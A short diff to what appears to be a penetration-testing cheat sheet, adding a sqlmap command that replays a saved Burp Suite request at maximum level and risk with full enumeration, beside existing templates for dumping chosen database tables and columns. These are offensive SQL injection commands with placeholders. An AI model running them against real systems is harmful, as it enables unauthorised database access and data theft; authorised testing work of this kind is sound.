@@ -100,3 +100,6 @@ sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<UR
 
 # sqlmap dump specific
 sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<URL>' -p "<DATA_PARAM>" --dbms=<DB_TYPE> -D <DB> -T <TABLE> -C <COL1>,<COL2> --dump
+
+# sqlmap request file save burpsuite request r.txt
+sqlmap --purge -r r.txt --level=5 --risk=3 -a
